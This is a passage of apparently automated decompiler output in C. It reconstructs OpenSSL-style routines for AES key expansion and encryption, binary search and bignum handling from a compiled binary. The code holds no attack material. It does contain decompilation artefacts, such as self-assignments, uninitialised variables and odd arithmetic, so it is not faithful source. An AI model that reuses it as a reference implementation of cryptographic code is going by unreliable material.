        int64_t v6 = a3;
        int32_t v7 = (int32_t)(v6 + v5) / 2; // 0x442b8d
        int64_t v8 = v7; // 0x442b8d
        v4 = (int64_t)(v7 * (int32_t)a4) + result2;
        int32_t v9 = v4;
        while (v9 < 0) {
            // 0x442bb1
            if (v5 >= v8) {
                // 0x442bb9
                v2 = v4;
                v3 = v8;
                if (v9 == 0) {
                    goto lab_0x442bf0;
                } else {
                    goto lab_0x442bbd;
                }
            }
            v6 = v8;
            v7 = (int32_t)(v6 + v5) / 2;
            v8 = v7;
            v4 = (int64_t)(v7 * (int32_t)a4) + result2;
            v9 = v4;
        }
        // 0x442b78
        v2 = v4;
        v3 = v8;
        while (v9 != 0) {
            int64_t v10 = v6 & 0xffffffff;
            int64_t v11 = v7 + 1; // 0x442b7a
            if (v10 <= v11) {
                goto lab_0x442bbd;
            }
            v5 = v11;
            v6 = v10;
            v7 = (int32_t)(v6 + v5) / 2;
            v8 = v7;
            v4 = (int64_t)(v7 * (int32_t)a4) + result2;
            v9 = v4;
            while (v9 < 0) {
                // 0x442bb1
                if (v5 >= v8) {
                    // 0x442bb9
                    v2 = v4;
                    v3 = v8;
                    if (v9 == 0) {
                        goto lab_0x442bf0;
                    } else {
                        goto lab_0x442bbd;
                    }
                }
                v6 = v8;
                v7 = (int32_t)(v6 + v5) / 2;
                v8 = v7;
                v4 = (int64_t)(v7 * (int32_t)a4) + result2;
                v9 = v4;
            }
            // 0x442b78
            v2 = v4;
            v3 = v8;
        }
    }
    goto lab_0x442bf0;
  lab_0x442bbd:;
    int64_t result = v4; // 0x442bc4
    int64_t result3 = 0; // 0x442bc4
    if (a6 % 2 == 0) {
        goto lab_0x442bcb;
    } else {
        goto lab_0x442bc6;
    }
  lab_0x442bf0:
    // 0x442bf0
    result = v2;
    if ((a6 & 2) == 0) {
      lab_0x442bc6:
        // 0x442bcb
        return result;
    }
    // 0x442bf7
    if (v3 == 0) {
        // 0x442bcb
        return result2;
    }
    int64_t v12 = 0x100000000 * a4; // 0x442bff
    int64_t v13 = 0x100000000 * v3;
    int64_t v14 = (v13 - 0x100000000) / 0x100000000 * v12 / 0x100000000; // 0x442c10
    if ((int32_t)v14 != 0) {
        // 0x442bcb
        return v13 / 0x100000000 * v12 / 0x100000000 + result2;
    }
    int64_t v15 = v13;
    int64_t v16 = v14 + result2; // 0x442b40
    v15 -= 0x100000000;
    result3 = v16;
    v16 += -v12 / 0x100000000;
    while ((int32_t)(v15 / 0x100000000) >= 1) {
        // 0x442c20
        v15 -= 0x100000000;
        result3 = v16;
        v16 += -v12 / 0x100000000;
    }
  lab_0x442bcb:
    // 0x442bcb
    return result3;
}

// Address range: 0x442c70 - 0x442c78
int64_t OBJ_bsearch_(int64_t * a1, int64_t * a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
    // 0x442c70
    return OBJ_bsearch_ex_((int64_t)a1, (int64_t)a2, a3, a4, a5, 0);
}

// Address range: 0x444000 - 0x444005
int64_t AES_set_encrypt_key(int64_t a1, int64_t a2, int64_t * a3) {
    // 0x444000
    return private_AES_set_encrypt_key();
}

// Address range: 0x444230 - 0x444491
int64_t _x86_64_AES_encrypt_compact(int64_t a1) {
    int64_t v1; // 0x444230
    int64_t v2; // 0x444230
    uint32_t v3 = *(int32_t *)v1 ^ (int32_t)v2; // 0x444260
    int64_t v4; // 0x444230
    uint32_t v5 = *(int32_t *)(v1 + 4) ^ (int32_t)v4; // 0x444263
    int64_t v6; // 0x444230
    uint32_t v7 = *(int32_t *)(v1 + 8) ^ (int32_t)v6; // 0x444267
    int64_t v8; // 0x444230
    uint32_t v9 = *(int32_t *)(v1 + 12) ^ (int32_t)v8; // 0x44426b
    int64_t v10 = v1 + 16; // 0x44426f
    int64_t v11; // 0x444230
    unsigned char v12 = *(char *)(v11 + (int64_t)(v3 % 256)); // 0x44427f
    unsigned char v13 = *(char *)(v11 + (int64_t)(v5 / 256 % 256)); // 0x44429d
    unsigned char v14 = *(char *)(v11 + (int64_t)(v7 / 0x10000 % 256)); // 0x4442c8
    int32_t v15 = 256 * (int32_t)v13 | (int32_t)v12;
    unsigned char v16 = *(char *)(v11 + (int64_t)(v9 / 0x1000000)); // 0x444305
    uint32_t v17 = v15 | 0x10000 * (int32_t)v14 | 0x1000000 * (int32_t)v16;
    // 0x444230
    while (v10 != a1) {
        unsigned char v18 = *(char *)(v11 + (int64_t)(v7 / 0x1000000)); // 0x44431b
        unsigned char v19 = *(char *)(v11 + (int64_t)(v3 / 256 % 256)); // 0x4442b5
        unsigned char v20 = *(char *)(v11 + (int64_t)(v9 % 256)); // 0x444298
        int32_t v21 = 256 * (int32_t)v19 | (int32_t)v20;
        unsigned char v22 = *(char *)(v11 + (int64_t)(v5 / 0x10000 % 256)); // 0x444300
        uint32_t v23 = v21 | 0x1000000 * (int32_t)v18 | 0x10000 * (int32_t)v22;
        unsigned char v24 = *(char *)(v11 + (int64_t)(v5 / 0x1000000)); // 0x444320
        unsigned char v25 = *(char *)(v11 + (int64_t)(v9 / 256 % 256)); // 0x4442b0
        unsigned char v26 = *(char *)(v11 + (int64_t)(v7 % 256)); // 0x444289
        int32_t v27 = 256 * (int32_t)v25 | (int32_t)v26;
        unsigned char v28 = *(char *)(v11 + (int64_t)(v3 / 0x10000 % 256)); // 0x4442ec
        uint32_t v29 = v27 | 0x1000000 * (int32_t)v24 | 0x10000 * (int32_t)v28;
        unsigned char v30 = *(char *)(v11 + (int64_t)(v7 / 256 % 256)); // 0x4442a2
        unsigned char v31 = *(char *)(v11 + (int64_t)(v5 % 256)); // 0x444284
        int32_t v32 = 256 * (int32_t)v30 | (int32_t)v31;
        unsigned char v33 = *(char *)(v11 + (int64_t)(v9 / 0x10000 % 256)); // 0x4442e7
        unsigned char v34 = *(char *)(v11 + (int64_t)(v3 / 0x1000000)); // 0x444316
        uint32_t v35 = 0x10000 * (int32_t)v33 | v32 | 0x1000000 * (int32_t)v34;
        int32_t v36 = (v17 & -0x7f7f7f80) % 128 & 0x1b1b1b1b ^ 2 * v17 & -0x1010102; // 0x4443ae
        int32_t v37 = (v35 & -0x7f7f7f80) % 128 & 0x1b1b1b1b ^ 2 * v35 & -0x1010102; // 0x4443b1
        uint32_t v38 = v36 ^ v17; // 0x4443b4
        uint32_t v39 = v37 ^ v35; // 0x4443b7
        uint32_t v40 = v17 / 0x10000; // 0x4443db
        uint32_t v41 = v40 | 0x10000 * v15; // 0x4443db
        uint32_t v42 = v35 / 0x10000; // 0x4443df
        uint32_t v43 = v42 | 0x10000 * v32; // 0x4443df
        int32_t v44 = (v29 & -0x7f7f7f80) % 128 & 0x1b1b1b1b ^ 2 * v29 & -0x1010102; // 0x44442a
        int32_t v45 = (v23 & -0x7f7f7f80) % 128 & 0x1b1b1b1b ^ 2 * v23 & -0x1010102; // 0x44442d
        uint32_t v46 = v44 ^ v29; // 0x444430
        uint32_t v47 = v45 ^ v23; // 0x444433
        uint32_t v48 = v29 / 0x10000; // 0x444445
        uint32_t v49 = v48 | 0x10000 * v27; // 0x444445
        uint32_t v50 = v23 / 0x10000; // 0x444449
        uint32_t v51 = v50 | 0x10000 * v21; // 0x444449
        v6 = (v49 / 256 | 0x1000000 * v48) ^ v49 ^ v44 ^ (v46 / 256 | 0x1000000 * v46);
        v8 = (v51 / 256 | 0x1000000 * v50) ^ v51 ^ v45 ^ (v47 / 256 | 0x1000000 * v47);
        v4 = (v43 / 256 | 0x1000000 * v42) ^ v43 ^ v37 ^ (v39 / 256 | 0x1000000 * v39);
        v2 = (v41 / 256 | 0x1000000 * v40) ^ v41 ^ v36 ^ (v38 / 256 | 0x1000000 * v38);
        v3 = *(int32_t *)v10 ^ (int32_t)v2;
        v5 = *(int32_t *)(v10 + 4) ^ (int32_t)v4;
        v7 = *(int32_t *)(v10 + 8) ^ (int32_t)v6;
        v9 = *(int32_t *)(v10 + 12) ^ (int32_t)v8;
        v10 += 16;
        v12 = *(char *)(v11 + (int64_t)(v3 % 256));
        v13 = *(char *)(v11 + (int64_t)(v5 / 256 % 256));
        v14 = *(char *)(v11 + (int64_t)(v7 / 0x10000 % 256));
        v15 = 256 * (int32_t)v13 | (int32_t)v12;
        v16 = *(char *)(v11 + (int64_t)(v9 / 0x1000000));
        v17 = v15 | 0x10000 * (int32_t)v14 | 0x1000000 * (int32_t)v16;
    }
    // 0x444480
    return (int64_t)(*(int32_t *)a1 ^ v17);
}

// Address range: 0x4444a0 - 0x444551
int64_t AES_encrypt(int64_t * a1, int64_t * a2, int64_t * a3) {
    int64_t v1 = (int64_t)a3;
    int64_t v2 = (int64_t)a1;
    int64_t v3; // bp-64, 0x4444a0
    int64_t v4 = &v3; // 0x4444b1
    int64_t v5 = v4 - (63 - v1 + v4 & 960); // 0x4444c2
    int64_t * v6 = (int64_t *)(v5 - 16); // 0x4444c9
    *v6 = (int64_t)a2;
    int64_t v7; // bp-48, 0x4444a0
    *(int64_t *)(v5 - 8) = (int64_t)&v7;
    *(int64_t *)(v5 - 32) = v1;
    *(int64_t *)(v5 - 24) = (int64_t)(16 * *(int32_t *)(v1 + 240)) + v1;
    int64_t result = _x86_64_AES_encrypt_compact(v7); // 0x444516
    int64_t v8 = *v6; // 0x44451b
    *(int32_t *)v8 = (int32_t)result;
    *(int32_t *)(v8 + 4) = *(int32_t *)(v2 + 4);
    *(int32_t *)(v8 + 8) = *(int32_t *)(v2 + 8);
    *(int32_t *)(v8 + 12) = *(int32_t *)(v2 + 12);
    return result;
}

// Address range: 0x444af0 - 0x444b27
int64_t private_AES_set_encrypt_key(void) {
    // 0x444af0
    int64_t v1; // 0x444af0
    int64_t v2; // 0x444af0
    int64_t v3; // 0x444af0
    return _x86_64_AES_set_encrypt_key(v1, v2, v3);
}

// Address range: 0x444b30 - 0x444db9
int64_t _x86_64_AES_set_encrypt_key(int64_t a1, int64_t a2, int64_t a3) {
    // 0x444b30
    if (a1 == 0 || a3 == 0) {
        // 0x444db7
        return -1;
    }
    // 0x444b52
    switch ((int32_t)a2) {
        case 128: {
            uint64_t v1 = *(int64_t *)(a1 + 8); // 0x444ba9
            *(int64_t *)a3 = a3;
            *(int64_t *)(a3 + 8) = v1;
            int64_t v2 = 0; // 0x444bba
            int64_t v3 = v1 / 0x100000000; // 0x444bba
            int64_t v4 = a3;
            unsigned char v5 = *(char *)(v3 % 256 + 0x445d80); // 0x444bc4
            unsigned char v6 = *(char *)(v3 / 256 % 256 + 0x445d80); // 0x444bd1
            unsigned char v7 = *(char *)(v3 / 0x10000 % 256 + 0x445d80); // 0x444bde
            unsigned char v8 = *(char *)(v3 / 0x1000000 + 0x445d80); // 0x444beb
            int32_t v9 = *(int32_t *)(4 * v2 + 0x446180); // 0x444bf5
            int32_t v10 = 0x1000000 * (int32_t)v5 ^ (int32_t)a3 ^ (int32_t)v6 ^ 256 * (int32_t)v7 ^ v9 ^ 0x10000 * (int32_t)v8; // 0x444bf5
            int64_t v11 = v4 + 16; // 0x444bfc
            int32_t * v12 = (int32_t *)v11; // 0x444bfc
            *v12 = v10;
            int32_t v13 = v10 ^ *(int32_t *)(v4 + 4); // 0x444bff
            *(int32_t *)(v4 + 20) = v13;
            int32_t v14 = v13 ^ *(int32_t *)(v4 + 8); // 0x444c05
            *(int32_t *)(v4 + 24) = v14;
            uint32_t v15 = *(int32_t *)(v4 + 12) ^ v14; // 0x444c0b
            *(int32_t *)(v4 + 28) = v15;
            int64_t v16 = v2 + 1; // 0x444c11
            while ((int32_t)v16 < 10) {
                int64_t v17 = (int64_t)*v12; // 0x444bbe
                v2 = v16 & 0xffffffff;
                v3 = v15;
                v4 = v11;
                v5 = *(char *)(v3 % 256 + 0x445d80);
                v6 = *(char *)(v3 / 256 % 256 + 0x445d80);
                v7 = *(char *)(v3 / 0x10000 % 256 + 0x445d80);
                v8 = *(char *)(v3 / 0x1000000 + 0x445d80);
                v9 = *(int32_t *)(4 * v2 + 0x446180);
                v10 = 0x1000000 * (int32_t)v5 ^ (int32_t)v17 ^ (int32_t)v6 ^ 256 * (int32_t)v7 ^ v9 ^ 0x10000 * (int32_t)v8;
                v11 = v4 + 16;
                v12 = (int32_t *)v11;
                *v12 = v10;
                v13 = v10 ^ *(int32_t *)(v4 + 4);
                *(int32_t *)(v4 + 20) = v13;
                v14 = v13 ^ *(int32_t *)(v4 + 8);
                *(int32_t *)(v4 + 24) = v14;
                v15 = *(int32_t *)(v4 + 12) ^ v14;
                *(int32_t *)(v4 + 28) = v15;
                v16 = v2 + 1;
            }
            // 0x444c1d
            *(int32_t *)(v4 + 96) = 10;
            // 0x444db7
            return 0;
        }
        case 192: {
            uint64_t v18 = *(int64_t *)(a1 + 16); // 0x444c33
            *(int64_t *)a3 = a3;
            *(int64_t *)(a3 + 8) = *(int64_t *)(a1 + 8);
            *(int64_t *)(a3 + 16) = v18;
            int64_t v19 = 0; // 0x444c48
            int64_t v20 = v18 / 0x100000000; // 0x444c48
            int64_t v21 = a3;
            unsigned char v22 = *(char *)(v20 % 256 + 0x445d80); // 0x444c54
            unsigned char v23 = *(char *)(v20 / 256 % 256 + 0x445d80); // 0x444c61
            unsigned char v24 = *(char *)(v20 / 0x10000 % 256 + 0x445d80); // 0x444c6e
            unsigned char v25 = *(char *)(v20 / 0x1000000 + 0x445d80); // 0x444c7b
            int32_t v26 = *(int32_t *)(4 * v19 + 0x446180); // 0x444c85
            int32_t v27 = 0x1000000 * (int32_t)v22 ^ (int32_t)a3 ^ (int32_t)v23 ^ 256 * (int32_t)v24 ^ v26 ^ 0x10000 * (int32_t)v25; // 0x444c85
            int64_t v28 = v21 + 24; // 0x444c8c
            int32_t * v29 = (int32_t *)v28; // 0x444c8c
            *v29 = v27;
            int32_t v30 = v27 ^ *(int32_t *)(v21 + 4); // 0x444c8f
            *(int32_t *)(v21 + 28) = v30;
            int32_t v31 = v30 ^ *(int32_t *)(v21 + 8); // 0x444c95
            *(int32_t *)(v21 + 32) = v31;
            int32_t v32 = *(int32_t *)(v21 + 12) ^ v31; // 0x444c9b
            *(int32_t *)(v21 + 36) = v32;
            while (v19 != 7) {
                int32_t v33 = *(int32_t *)(v21 + 16) ^ v32; // 0x444ca9
                *(int32_t *)(v21 + 40) = v33;
                uint32_t v34 = *(int32_t *)(v21 + 20) ^ v33; // 0x444caf
                *(int32_t *)(v21 + 44) = v34;
                int64_t v35 = (int64_t)*v29; // 0x444c4e
                v19 = v19 + 1 & 0xffffffff;
                v20 = v34;
                v21 = v28;
                v22 = *(char *)(v20 % 256 + 0x445d80);
                v23 = *(char *)(v20 / 256 % 256 + 0x445d80);
                v24 = *(char *)(v20 / 0x10000 % 256 + 0x445d80);
                v25 = *(char *)(v20 / 0x1000000 + 0x445d80);
                v26 = *(int32_t *)(4 * v19 + 0x446180);
                v27 = 0x1000000 * (int32_t)v22 ^ (int32_t)v35 ^ (int32_t)v23 ^ 256 * (int32_t)v24 ^ v26 ^ 0x10000 * (int32_t)v25;
                v28 = v21 + 24;
                v29 = (int32_t *)v28;
                *v29 = v27;
                v30 = v27 ^ *(int32_t *)(v21 + 4);
                *(int32_t *)(v21 + 28) = v30;
                v31 = v30 ^ *(int32_t *)(v21 + 8);
                *(int32_t *)(v21 + 32) = v31;
                v32 = *(int32_t *)(v21 + 12) ^ v31;
                *(int32_t *)(v21 + 36) = v32;
            }
            // 0x444cbb
            *(int32_t *)(v21 + 72) = 12;
            // 0x444db7
            return 0;
        }
        case 256: {
            uint64_t v36 = *(int64_t *)(a1 + 24); // 0x444cd5
            *(int64_t *)a3 = a3;
            *(int64_t *)(a3 + 8) = *(int64_t *)(a1 + 8);
            *(int64_t *)(a3 + 16) = *(int64_t *)(a1 + 16);
            *(int64_t *)(a3 + 24) = v36;
            int64_t v37 = 0; // 0x444cee
            int64_t v38 = v36 / 0x100000000; // 0x444cee
            int64_t v39 = a3;
            unsigned char v40 = *(char *)(v38 % 256 + 0x445d80); // 0x444cf8
            unsigned char v41 = *(char *)(v38 / 256 % 256 + 0x445d80); // 0x444d05
            unsigned char v42 = *(char *)(v38 / 0x10000 % 256 + 0x445d80); // 0x444d12
            unsigned char v43 = *(char *)(v38 / 0x1000000 + 0x445d80); // 0x444d1f
            int32_t v44 = *(int32_t *)(4 * v37 + 0x446180); // 0x444d29
            int32_t v45 = 0x1000000 * (int32_t)v40 ^ (int32_t)a3 ^ (int32_t)v41 ^ 256 * (int32_t)v42 ^ v44 ^ 0x10000 * (int32_t)v43; // 0x444d29
            int64_t v46 = v39 + 32; // 0x444d30
            int32_t * v47 = (int32_t *)v46; // 0x444d30
            *v47 = v45;
            int32_t v48 = v45 ^ *(int32_t *)(v39 + 4); // 0x444d33
            *(int32_t *)(v39 + 36) = v48;
            int32_t v49 = v48 ^ *(int32_t *)(v39 + 8); // 0x444d39
            *(int32_t *)(v39 + 40) = v49;
            uint32_t v50 = *(int32_t *)(v39 + 12) ^ v49; // 0x444d3f
            *(int32_t *)(v39 + 44) = v50;
            while (v37 != 6) {
                uint64_t v51 = (int64_t)v50; // 0x444d3f
                int32_t v52 = *(int32_t *)(v39 + 16); // 0x444d4f
                unsigned char v53 = *(char *)(v51 % 256 + 0x445d80); // 0x444d55
                unsigned char v54 = *(char *)(v51 / 256 % 256 + 0x445d80); // 0x444d5f
                unsigned char v55 = *(char *)(v51 / 0x10000 % 256 + 0x445d80); // 0x444d6f
                unsigned char v56 = *(char *)(v51 / 0x1000000 + 0x445d80); // 0x444d7c
                int32_t v57 = v52 ^ (int32_t)v53 ^ 256 * (int32_t)v54 ^ 0x10000 * (int32_t)v55 ^ 0x1000000 * (int32_t)v56; // 0x444d84
                *(int32_t *)(v39 + 48) = v57;
                int32_t v58 = v57 ^ *(int32_t *)(v39 + 20); // 0x444d89
                *(int32_t *)(v39 + 52) = v58;
                int32_t v59 = v58 ^ *(int32_t *)(v39 + 24); // 0x444d8f
                *(int32_t *)(v39 + 56) = v59;
                uint32_t v60 = *(int32_t *)(v39 + 28) ^ v59; // 0x444d95
                *(int32_t *)(v39 + 60) = v60;
                int64_t v61 = (int64_t)*v47; // 0x444cf2
                v37 = v37 + 1 & 0xffffffff;
                v38 = v60;
                v39 = v46;
                v40 = *(char *)(v38 % 256 + 0x445d80);
                v41 = *(char *)(v38 / 256 % 256 + 0x445d80);
                v42 = *(char *)(v38 / 0x10000 % 256 + 0x445d80);
                v43 = *(char *)(v38 / 0x1000000 + 0x445d80);
                v44 = *(int32_t *)(4 * v37 + 0x446180);
                v45 = 0x1000000 * (int32_t)v40 ^ (int32_t)v61 ^ (int32_t)v41 ^ 256 * (int32_t)v42 ^ v44 ^ 0x10000 * (int32_t)v43;
                v46 = v39 + 32;
                v47 = (int32_t *)v46;
                *v47 = v45;
                v48 = v45 ^ *(int32_t *)(v39 + 4);
                *(int32_t *)(v39 + 36) = v48;
                v49 = v48 ^ *(int32_t *)(v39 + 8);
                *(int32_t *)(v39 + 40) = v49;
                v50 = *(int32_t *)(v39 + 12) ^ v49;
                *(int32_t *)(v39 + 44) = v50;
            }
            // 0x444da4
            *(int32_t *)(v39 + 48) = 14;
            // 0x444db7
            return 0;
        }
    }
    // 0x444db7
    return -2;
}

// Address range: 0x4474c0 - 0x4475e6
int64_t BN_num_bits_word(uint64_t a1) {
    if (a1 < 0x100000000) {
        if ((a1 & 0xffff0000) == 0) {
            if ((a1 & 0xff00) != 0) {
                unsigned char v1 = *(char *)((int64_t)(0x1000000 * a1) / 0x100000000 + (int64_t)&g2); // 0x4475de
                return (int64_t)v1 + 8;
            }
            unsigned char result = *(char *)((int64_t)(0x100000000 * a1) / 0x100000000 + (int64_t)&g2); // 0x44754d
            return result;
        }
        if ((a1 & 0xff000000) == 0) {
            unsigned char v2 = *(char *)((int64_t)(0x10000 * a1) / 0x100000000 + (int64_t)&g2); // 0x4475be
            return (int64_t)v2 + 16;
        }
        unsigned char v3 = *(char *)((int64_t)(256 * a1) / 0x100000000 + (int64_t)&g2); // 0x44752a
        return (int64_t)v3 + 24;
    }
    if (a1 < 0x1000000000000) {
        if (a1 % 0xff0000000001 == 0) {
            unsigned char v4 = *(char *)(a1 / 0x100000000 + (int64_t)&g2); // 0x4475a3
            return (int64_t)v4 + 32;
        }
        unsigned char v5 = *(char *)(a1 / 0x10000000000 + (int64_t)&g2); // 0x447572
        return (int64_t)v5 + 40;
    }
    if (a1 < 0x100000000000000) {
        unsigned char v6 = *(char *)(a1 / 0x1000000000000 + (int64_t)&g2); // 0x44758b
        return (int64_t)v6 + 48;
    }
    unsigned char v7 = *(char *)(a1 / 0x100000000000000 + (int64_t)&g2); // 0x4474fc
    return (int64_t)v7 + 56;
}

// Address range: 0x4475f0 - 0x447619
int64_t BN_num_bits(int64_t a1) {
    uint32_t v1 = *(int32_t *)(a1 + 8); // 0x4475f1
    if (v1 == 0) {
        // 0x4475fa
        return 0;
    }
    int64_t v2 = (int64_t)v1 + 0xffffffff; // 0x447603
    int64_t v3 = *(int64_t *)(0x100000000 * v2 / 0x20000000 + a1); // 0x44760c
    return BN_num_bits_word(v3) + 64 * v2 & 0xffffffff;
}

// Address range: 0x4476b0 - 0x44771a
int64_t BN_bn2bin(int64_t a1, int64_t a2) {
    int32_t v1 = BN_num_bits(a1);
    uint32_t result = v1 / 0x4000; // 0x4476ca
    if (v1 < 0x4000) {
        // 0x447713
        return result;
    }
    int64_t v2 = result - 1; // 0x4476d4
    int64_t v3 = a2; // 0x4476d4
    int32_t v4 = v2;
    int64_t v5 = v2 + 0xffffffff; // 0x4476f4
    uint64_t v6 = *(int64_t *)(8 * (int64_t)((v4 >= 0 ? v4 : v4 + 7) / 8) + a1); // 0x4476fc
    *(char *)v3 = (char)(v6 >> (8 * v2 & 56));
    v2 = v5 & 0xffffffff;
    v3++;
    while ((int32_t)v5 != -1) {
        // 0x4476d8
        v4 = v2;
        v5 = v2 + 0xffffffff;
        v6 = *(int64_t *)(8 * (int64_t)((v4 >= 0 ? v4 : v4 + 7) / 8) + a1);
        *(char *)v3 = (char)(v6 >> (8 * v2 & 56));
        v2 = v5 & 0xffffffff;
        v3++;
    }
    // 0x447713
    return result;
}

// Address range: 0x447790 - 0x447852
int64_t BN_cmp(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
    if (a2 == 0) {
        if (a1 == 0) {
            // 0x447848
            return (bool)(a2 != 0);
        }
        // 0x447820
        return 0xffffffff;
    }
    if (a1 == 0) {
        // 0x447848
        return (bool)(a2 != 0);
    }
    int32_t v1 = *(int32_t *)(a1 + 16); // 0x4477a3
    if (v1 != *(int32_t *)(a2 + 16)) {
        // 0x447830
        if (v1 == 0) {
            // 0x447820
            return 1;
        }
        // 0x447820
        return 0xffffffff;
    }
    int32_t v2 = *(int32_t *)(a1 + 8); // 0x4477bc
    int64_t result = v1 == 0 ? 1 : 0xffffffff; // 0x4477c4
    int32_t v3 = *(int32_t *)(a2 + 8); // 0x4477c7
    if (v2 > v3) {
        // 0x447820
        return result;
    }
    int64_t result2 = v1 == 0 ? 0xffffffff : 1; // 0x4477b5
    if (v2 < v3) {
        // 0x447820
        return result2;
    }
    int32_t v4 = v2 - 1; // 0x4477ce
    if (v4 < 0) {
        // 0x447820
        return 0;
    }
    int64_t v5 = 0x100000000 * (int64_t)v4 / 0x20000000; // 0x4477dc
    uint64_t v6 = *(int64_t *)(v5 + a2); // 0x4477e4
    uint64_t v7 = *(int64_t *)(v5 + a1); // 0x4477e8
    if (v7 > v6) {
        // 0x447820
        return result;
    }
    // 0x4477ee
    if (v7 < v6) {
        // 0x447820
        return result2;
    }
    int64_t v8 = v5 - 8; // 0x4477f0
    int64_t v9 = v8 + a2; // 0x4477fc
    int32_t v10 = v4; // 0x4477fc
    int64_t v11 = v8 + a1; // 0x4477fc
    v10--;
    int64_t result3 = 0; // 0x44781b
    while (v10 >= 0) {
        uint64_t v12 = *(int64_t *)v11; // 0x447800
        uint64_t v13 = *(int64_t *)v9; // 0x447803
        result3 = result;
        if (v12 > v13) {
            // break -> 0x447820
            break;
        }
        // 0x44780b
        v9 -= 8;
        v11 -= 8;
        result3 = result2;
        if (v12 < v13) {
            // break -> 0x447820
            break;
        }
        v10--;
        result3 = 0;
    }
    // 0x447820
    return result3;
}

// Address range: 0x4478d0 - 0x4478fb
int64_t BN_is_bit_set(int64_t a1, uint64_t a2) {
    int32_t v1 = a2; // 0x4478d0
    if (v1 < 0) {
        // 0x4478f8
        return 0;
    }
    int32_t v2 = v1 / 64;
    if (v2 < *(int32_t *)(a1 + 8)) {
        // 0x4478de
        return (*(int64_t *)((int64_t)(8 * v2) + a1) >> a2 % 64) % 2;
    }
    // 0x4478f8
    return 0;
}

// Address range: 0x447ae0 - 0x447af8
int64_t BN_init(int64_t a1) {
    // 0x447ae0
    *(int64_t *)a1 = 0;
    *(int64_t *)(a1 + 8) = 0;
    *(int64_t *)(a1 + 16) = 0;
    int64_t result; // 0x447ae0
    return result;
}

// Address range: 0x447b00 - 0x447b45
int64_t BN_free(int64_t a1) {
    // 0x447b00
    if (a1 == 0) {
        // 0x447b29
        int64_t result; // 0x447b00
        return result;
    }
    int32_t * v1 = (int32_t *)(a1 + 20); // 0x447b11
    uint32_t v2 = *v1; // 0x447b11
    int64_t v3; // 0x447b00
    int64_t v4; // 0x447b00
    if ((v2 & 2) == 0) {
        // 0x447b30
        CRYPTO_free(a1, v4);
        uint32_t v5 = *v1; // 0x447b35
        v3 = v5;
        if (v5 % 2 != 0) {
            // 0x447b3c
            return CRYPTO_free(a1, v4);
        }
    } else {
        int64_t v6 = v2; // 0x447b11
        v3 = v6;
        if (v6 % 2 != 0) {
            // 0x447b3c
            return CRYPTO_free(a1, v4);
        }
    }
    int64_t result2 = v3 | 0x8000; // 0x447b1c
    *(int64_t *)a1 = 0;
    *v1 = (int32_t)result2;
    // 0x447b29
    return result2;
}

// Address range: 0x447b50 - 0x447caf
int64_t bn_expand_internal(int64_t a1, int64_t a2) {
    // 0x447b50
    if ((int32_t)a2 > 0x7fffff) {
        // 0x447c65
        ERR_put_error(3, 120, 114, "bn_lib.c", 309);
        return 0;
    }
    // 0x447b60
    if ((*(char *)(a1 + 20) & 2) != 0) {
        // 0x447c40
        ERR_put_error(3, 120, 105, "bn_lib.c", 314);
        return 0;
    }
    int64_t v1 = 8 * a2 & 0xfffffff8; // 0x447b6a
    int64_t v2; // 0x447b50
    int64_t v3; // 0x447b50
    int64_t result = CRYPTO_malloc(v1, "bn_lib.c", 317, v3, v2); // 0x447b7d
    if (result == 0) {
        // 0x447c8a
        ERR_put_error(3, 120, 65, "bn_lib.c", 320);
        return 0;
    }
    if (v1 == 0) {
        // 0x447c17
        return result;
    }
    int32_t v4 = *(int32_t *)(a1 + 8); // 0x447b97
    int64_t v5 = v1; // 0x447ba8
    int64_t v6 = result; // 0x447ba8
    if (v4 >= 0 && v4 >= 4) {
        int64_t v7 = 32 * (int64_t)(v4 / 4) + 0x1fffffffe0 & 0x1fffffffe0; // 0x447bb0
        int64_t v8 = 0;
        int64_t v9 = v8 + v1;
        int64_t v10 = v8 + result;
        *(int64_t *)(v10 + 8) = *(int64_t *)(v9 + 8);
        *(int64_t *)(v10 + 16) = *(int64_t *)(v9 + 16);
        *(int64_t *)v10 = *(int64_t *)v9;
        *(int64_t *)(v10 + 24) = *(int64_t *)(v9 + 24);
        int64_t v11 = v8 + 32; // 0x447bed
        while (v8 != v7) {
            // 0x447bc0
            v8 = v11;
            v9 = v8 + v1;
            v10 = v8 + result;
            *(int64_t *)(v10 + 8) = *(int64_t *)(v9 + 8);
            *(int64_t *)(v10 + 16) = *(int64_t *)(v9 + 16);
            *(int64_t *)v10 = *(int64_t *)v9;
            *(int64_t *)(v10 + 24) = *(int64_t *)(v9 + 24);
            v11 = v8 + 32;
        }
        int64_t v12 = v7 + 32; // 0x447bf7
        v5 = v12 + v1;
        v6 = v12 + result;
    }
    // 0x447c02
    switch (v4 % 4) {
        case 3: {
            // 0x447c20
            *(int64_t *)(v6 + 16) = *(int64_t *)(v5 + 16);
        }
        case 2: {
            // 0x447c28
            *(int64_t *)(v6 + 8) = *(int64_t *)(v5 + 8);
        }
        case 1: {
            // 0x447c30
            *(int64_t *)v6 = *(int64_t *)v5;
            return result;
        }
        default: {
            // 0x447c17
            return result;
        }
    }
}

// Address range: 0x447cb0 - 0x447d0e
int64_t bn_expand2(int64_t result, uint64_t a2) {
    int32_t * v1 = (int32_t *)(result + 12); // 0x447cc6
    if ((int64_t)*v1 >= a2) {
        // 0x447ccd
        return result;
    }
    int64_t v2 = bn_expand_internal(result, a2); // 0x447ce8
    if (v2 == 0) {
        // 0x447ccd
        return 0;
    }
    if (result != 0) {
        // 0x447cfd
        CRYPTO_free(result, a2);
    }
    // 0x447d02
    *(int64_t *)result = v2;
    *v1 = (int32_t)a2;
    // 0x447ccd
    return result;
}

// Address range: 0x447d10 - 0x447dd5
int64_t BN_set_bit(int64_t a1, uint64_t a2) {
    int32_t v1 = a2; // 0x447d2a
    if (v1 < 0) {
        // 0x447d8f
        return 0;
    }
    int32_t * v2 = (int32_t *)(a1 + 8); // 0x447d35
    uint32_t v3 = *v2; // 0x447d35
    uint32_t v4 = v1 / 64;
    uint32_t v5; // 0x447dc5
    uint32_t v6; // 0x447d10
    if (v4 < v3) {
        goto lab_0x447d6f;
    } else {
        // 0x447d41
        v6 = v4 + 1;
        v5 = v3;
        if (*(int32_t *)(a1 + 12) > v4) {
            goto lab_0x447d4a;
        } else {
            // 0x447db0
            if (bn_expand2(a1, (int64_t)v6) == 0) {
                // 0x447d8f
                return 0;
            }
            // 0x447dc5
            v5 = *v2;
            if (v4 < v5) {
                // 0x447d6a
                *v2 = v6;
                goto lab_0x447d6f;
            } else {
                goto lab_0x447d4a;
            }
        }
    }
